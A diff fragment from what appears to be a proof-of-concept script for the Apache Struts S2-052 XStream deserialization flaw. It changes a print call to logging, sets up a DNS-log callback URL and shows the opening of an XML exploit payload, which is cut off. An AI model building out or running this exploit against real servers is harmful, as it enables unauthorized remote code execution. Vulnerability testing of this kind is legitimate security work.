@@ -26,7 +26,7 @@ def poc(url):
 
     mydnslog = Dnslog("s2-052")
     weburl = mydnslog.getWeburl()
-    print("weblog url: %s" % weburl)
+    logging.info("weblog url: %s" % weburl)
     payload = """<map>
   <entry>
     <jdk.nashorn.internal.objects.NativeString>
